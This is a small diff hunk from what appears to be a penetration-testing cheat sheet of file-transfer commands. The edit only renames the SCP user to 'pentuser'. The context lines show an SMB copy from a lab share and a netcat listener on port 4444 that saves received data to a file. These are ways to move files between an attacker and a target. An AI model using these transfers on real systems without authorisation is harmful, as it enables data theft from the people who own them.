@@ -26,7 +26,7 @@ command: |
   # Windows target: copy \\10.10.14.1\share\file C:\Temp\file
 
   # SCP
-  scp file john@10.10.10.1:/tmp/file
+  scp file pentuser@10.10.10.1:/tmp/file
 
   # Netcat
   # Receiver: nc -lvnp 4444 > file
